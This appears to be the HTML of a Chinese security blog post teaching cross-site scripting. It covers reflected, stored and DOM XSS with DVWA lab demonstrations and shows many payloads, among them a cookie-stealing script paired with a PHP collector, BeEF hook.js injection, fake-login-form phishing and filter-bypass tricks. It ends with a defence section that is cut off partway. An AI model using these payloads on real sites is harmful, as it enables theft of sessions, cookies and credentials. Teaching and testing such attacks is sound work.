@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="krismile" />
+
+
+
+<meta name="description" content="XSS攻击漏洞概述XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。 XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS攻击">
+<meta property="og:url" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="KrismileBlog">
+<meta property="og:description" content="XSS攻击漏洞概述XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。 XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网">
+<meta property="og:locale">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/5.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/6.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/7.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/2.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/3.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/4.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/8.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/9.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/10.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/11.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/12.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/13.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/14.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/15.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/16.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/17.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/18.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/19.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/20.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/21.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/22.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/23.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/24.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/javascript:alert(‘xss’)">
+<meta property="article:published_time" content="2022-04-09T07:30:39.000Z">
+<meta property="article:modified_time" content="2022-04-09T15:29:25.645Z">
+<meta property="article:author" content="krismile">
+<meta property="article:tag" content="web基础">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="KrismileBlog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/head.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>XSS攻击 | KrismileBlog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/head.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/categories/">文章分类</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">哈哈哈</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/head.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/">文章分类</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-XSS攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/" class="article-date">
+      <time datetime="2022-04-09T07:30:39.000Z" itemprop="datePublished">2022-04-09</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XSS攻击
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。</p>
+<p>XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网页中，并由浏览器解释运行这段JS脚本注入的网页，以达到恶意攻击的效果。用户用最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意，即XSS的对象是用户和浏览器。</p>
+<p>XSS危害：</p>
+<blockquote>
+<p>1.窃取用户Cookie，如果用户Cookie被窃取，攻击者可以不通过密码，而直接登录用户账户<br>2.使用XMLHttpRequest构造模拟用户请求操作<br>3.XSS钓鱼攻击<br>4.用户PC信息探测收集器<br>5.XSS蠕虫攻击</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h2><blockquote>
+<p>1.弹窗警告</p>
+<p>用此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入的单引号来测试漏洞的存在，一旦此脚本能执行，意味这没有对特殊字符做过滤，因此存在XSS漏洞。</p>
+<p>常见HTML事件属性</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>onload</td>
+<td>script</td>
+<td>当文档加载时运行脚本</td>
+</tr>
+<tr>
+<td>onerror</td>
+<td>script</td>
+<td>当错误发生时运行脚本</td>
+</tr>
+<tr>
+<td>onclick</td>
+<td>script</td>
+<td>当单击鼠标时运行脚本</td>
+</tr>
+</tbody></table>
+<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></p>
+<p><code>&lt;img src=# onerroe=alert(&#39;xss&#39;)&gt;</code>      **src地址错误，然后执行onerror的内容</p>
+<p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code>     ** 点击click时弹出xss</p>
+<p>2.页面嵌套</p>
+<p><code>&lt;iframe src=http://www.xxxxx.com width=300 height=300&gt;&lt;/iframe&gt;</code></p>
+<p><code>&lt;iframe src=http://www.xxxxx.com width=0 height=0 border=0&gt;&lt;/iframe&gt;</code></p>
+<p>3.页面重定向</p>
+<p><code>&lt;script&gt;window.location=&quot;http://www.xxxxx.com&quot;&lt;/script&gt;</code></p>
+<p><code>&lt;script&gt;location.href=&quot;http://www.xxxxx.com&quot;&lt;/script&gt;</code></p>
+<p>4.弹窗警告并重定向</p>
+<p><code>&lt;script&gt;alert(&#39;xxx&#39;);location.href=&quot;xxxxxx&quot;&lt;/script&gt;</code></p>
+<p>5.访问恶意代码</p>
+<p><code>&lt;script src=&quot;http://www.baidu.com/xss.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>6.巧用图片标签</p>
+<p><code>&lt;img src=&quot;#&quot;alert(&#39;xss&#39;)&gt;</code></p>
+<p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></p>
+<p><code>&lt;img src=&quot;http://xxxx/hook.js&quot;&gt;&lt;/img&gt;</code></p>
+<p>7.根据上下文进行闭合+以上脚本</p>
+</blockquote>
+<h2 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h2><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射性跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到URL地址的参数中。</p>
+<p>反射型XSS的利用一般是攻击者通过特定手段（如电子邮件），诱使用户去访问一个包含恶意代码的URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类XSS通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端Cookie或进行钓鱼欺骗。</p>
+<p>实验（DVWA－XSS（Reflected））：</p>
+<p><strong>弹窗警告：</strong></p>
+<p><code>&lt;script&gt;alert(1)&lt;/script&gt;  </code></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png" alt="1"></p>
+<p><code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/5.png" alt="5"></p>
+<p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/6.png" alt="6"></p>
+<p><code>&lt;img src=&#39;http://192.168.10.128/a.jpg&#39; onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/7.png" alt="7"></p>
+<p><strong>重定向</strong>：</p>
+<p><code>&lt;script&gt;window.location=&#39;http://www.baidu.com&#39;&lt;/script&gt;</code></p>
+<p>页面跳转到百度</p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>此类XSS不需要用户点击特定URL就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码的页面就会执行恶意代码。一般出现在网站留言、评论、博客日志等交互处，*<code>恶意脚本存储到客户端或者服务端的数据库中</code>*（再次访问依然会执行恶意代码）。</p>
+<p>实验：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/2.png"></p>
+<p>跳出此页面（点击任意一个项目，如XSS(DOM)这一栏）</p>
+<p>再点击XSS(Stored)，页面如下：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/3.png"></p>
+<h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM　XSS"></a>DOM　XSS</h4><p>这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。</p>
+<p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/4.png"></p>
+<h2 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h2><h4 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h4><p>方法一：弹窗警告</p>
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/8.png" alt="8"></p>
+<p>方法二：</p>
+<p><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
+<p>在phpstudy的www目录下，新建一个php文件，将以下代码写入</p>
+<blockquote>
+<?php
+$cookie= $_GET['cookie'];
+file_put_contents('cookie.txt',$cookie);
+?>
+</blockquote>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/9.png" alt="9"></p>
+<h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><p>使用Cookie存在一定的安全缺陷，开发者开始使用一些更安全的认证方式，如session。在Session机制中，客户端和服务端通过标识符来识别用户身份和维持会话。会话劫持的本质是在攻击中带上cookie并发送到了服务端。</p>
+<p>如在某留言系统存在一个存储型XSS漏洞，攻击者吧XSS代码写进留言信息中，当管理员登录后台并查看，便会触发XSS漏洞，由于XSS是在后台触发的，所以攻击的对象是管理员，通过注入JS代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的</p>
+<p>实验（XSS(Stored)）</p>
+<blockquote>
+<p>工具（beef-xss）：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/10.png"></p>
+<p>改一下代码：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/11.png" alt="11"></p>
+<p>启动beef-xss（kali机自带）：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/12.png"></p>
+<p>打开后跳出一个终端：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/13.png"></p>
+<p>访问 <code>http://127.0.0.1:3000/ui/panel</code></p>
+<p>在XSS（Stored）的message中插入hook.js代码 <code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>，其中<IP>改为虚拟机Ip地址即可</IP></p>
+<p>***查看虚拟机Ip地址：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/14.png"></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/15.png" alt="15"></p>
+<p>DVWA页面如下：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/16.png"></p>
+<p>查看beef网站：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/17.png" alt="17"></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/18.png" alt="18"></p>
+<p>***beef工具：登录弹窗，获取用户及密码</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/19.png"></p>
+<p>DVWA出现登录弹窗：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/20.png"></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/21.png"></p>
+</blockquote>
+<h4 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h4><p>XSS并非全能，前面的例子主要通过JavScript脚本自动攻击，缺少“与用户交互”的过程（即用户不需要输入账户密码，只要触发Js脚本）</p>
+<p>例如“修改用户密码”的功能中，在提交新密码前，都要求用户输入“旧 password” ，而往往攻击者不知道。</p>
+<p>修改密码问题— 为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。</p>
+<p>实现的思路：利用JavaScript在当前页面上显示一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将发送至黑客的服务器上。</p>
+<h5 id="重定向钓鱼"><a href="#重定向钓鱼" class="headerlink" title="重定向钓鱼"></a>重定向钓鱼</h5><p>把当前页面重定向到一个钓鱼页面（可以是自己搭建的页面，来获取用户的信息）</p>
+<p><code>http://www.bug.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code></p>
+<p>例：</p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/22.png" alt="22"></p>
+<h5 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h5><p>使用XSS漏洞注入HTML或JavaScript代码到页面中</p>
+<p><code>http://www.bug.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code> 该段代码会在正常页面中嵌入一个Form表单（登录框）</p>
+<p>例：<br><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/23.png"></p>
+<h5 id="iframe钓鱼"><a href="#iframe钓鱼" class="headerlink" title="iframe钓鱼"></a>iframe钓鱼</h5><p>通过<iframe>标签嵌入远程域的一个页面实施钓鱼</iframe></p>
+<p><code>http://www.bug.com/index.php?search=&#39;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</code></p>
+<p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/24.png" alt="24"></p>
+<h4 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h4><p>在IE中，可以通过判断ActiveX控件的classid是否存在，来推断用户是否安装了该软件。这种方法很早被用于“挂马攻击”—黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。</p>
+<p>如下代码：</p>
+<blockquote>
+<p>try {</p>
+<p>var Obj&#x3D; new ActiveXObject(‘xxxxxx’)       &#x2F;&#x2F;xxxxxx为某控件</p>
+<p>}catch(e){</p>
+<p>&#x2F;&#x2F;异常了，不存在该控件</p>
+<p>}</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Monsterlz123/article/details/91127385">通过XSS进行网页挂马复现</a></p>
+<h4 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h4><p>2005年，19岁的Samy Kamkar发起对Myspace.com的XSS的XSS Worm攻击（Web安全史上第一个重量级的XSS Worm）</p>
+<p>XSS Worm是XSS的一种终极利用方式，它的破坏性和影响力巨大，但也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在存储型XSS（注意发送站内信、用户留言等页面），则比较容易发生XSS Worm攻击。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33605106/article/details/79756478">百度XSS Worm</a></p>
+<h2 id="XSS攻击技巧"><a href="#XSS攻击技巧" class="headerlink" title="XSS攻击技巧"></a>XSS攻击技巧</h2><ul>
+<li><p>利用字符编码</p>
+<p>利用字符编码，通过这种技巧，不仅能让 XSS 代码绕过服务端的过滤，还能更好地隐藏 Shellcode；（ JS 支持 unicode、eacapes、十六进制、十进制等编码形式）</p>
+</li>
+<li><p>绕过 XSS-Filter，利用 &lt;&gt; 标签注入 Html&#x2F;JavaScript 代码；</p>
+</li>
+<li><p>利用 HTML 标签的属性值进行 XSS 攻击。例如：<img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/javascript:alert(‘xss’)">；（当然并不是所有的 Web 浏览器都支持 Javascript 伪协议，所以此类 XSS 攻击具有一定的局限性）</p>
+</li>
+<li><p>空格、回车和 Tab。如果 XSS Filter 仅仅将敏感的输入字符列入黑名单，比如 javascript，用户可以利用空格、回车和 Tab 键来绕过过滤，例如：&lt;img src&#x3D;“javas cript:alert(&#x2F;xss&#x2F;);”&#x2F;&gt;；</p>
+</li>
+<li><p>利用事件来执行跨站脚本。例如：&lt;img src&#x3D;”#” onerror&#x3D; “alert(1)”&#x2F;&gt;，当 src 错误的视乎就会执行 onerror 事件；</p>
+</li>
+<li><p>利用 CSS 跨站。例如：body {backgrund-image: url(“javascript:alert(‘xss’)”)}；扰乱过滤规则。例如：&lt;IMG SRC&#x3D;“javaSCript: alert(&#x2F;xss&#x2F;);”&#x2F;&gt;；</p>
+</li>
+<li><p>拆分跨站法，将 XSS 攻击的代码拆分开来，适用于应用程序没有过滤 XSS 关键字符（如&lt;、&gt;）却对输入字符长度有限制的情况下；</p>
+</li>
+<li><p>DOM 型的 XSS 主要是由客户端的脚本通过 DOM 动态地输出数据到页面上，它不依赖于提交数据到服务器，而是从客户端获得DOM中的数据在本地执行。容易导致 DOM 型的 XSS 的输入源包括：Document.URL、Location(.pathname|.href|.search|.hash)、Document.referrer、Window.name、Document.cookie、localStorage&#x2F;globalStorage；</p>
+</li>
+</ul>
+<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如＜、＞、‘　、“等，如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查，可能还会匹配XSS的特征。比如”<script>“，”javascript"等敏感字符。这种输入检查的方式，可以称为“XSS Filter”</p>
+<p>但XSS Filter进行XSS检查时，用户数据没有结合渲染页面的HTML代码，因此XSS Filter 对语境的理解并不完整；且对“<”、“>”等字符的处理，可能会改变用户数据的语义。</p>
+<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>一般来说，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击</p>
+<p>编码分为很多种，有针对html，javascript等的编码方式</p>
+<p>**1.**针对HTML的编码方式：HTMLEncode</p>
+<p>为了对抗XSS，要求至少转换以下字符：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>编码后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;</td>
+<td>&amp;amp</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>&amp;lt</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>&amp;gt</td>
+</tr>
+<tr>
+<td>“</td>
+<td>&amp;quot</td>
+</tr>
+<tr>
+<td>‘</td>
+<td>&amp;#x27</td>
+</tr>
+<tr>
+<td>&#x2F;</td>
+<td>&amp;#x2F</td>
+</tr>
+</tbody></table>
+<p>**2.**在php中，有phplentities()和htmlspecialchars()两个函数可以满足安全要求</p>
+<p>**3.**针对jJS的编码方式：JavascriptEncode</p>
+<p>与HTMLEncode不同，他需要使用“/“对特殊字符进行转义</p>
+<p>在对抗XSS时，还要求输出的变量必须在引号内部。比较以下两种写法：</p>
+<blockquote>
+<p>var x = escapeJavascript ( $ evil ) ;</p>
+<p>var y =' " ' +escapeJavascript ( $ evil ) + ' " ' ;</p>
+</blockquote>
+<p>如果escapeJavascript()函数只转义几个危险字符，比如 ’、“、< 、> 、\ 、& 、# 等，那么上面的两行代码输出后可能会变成：</p>
+<blockquote>
+<p>var x = 1 ; alert (2) ;</p>
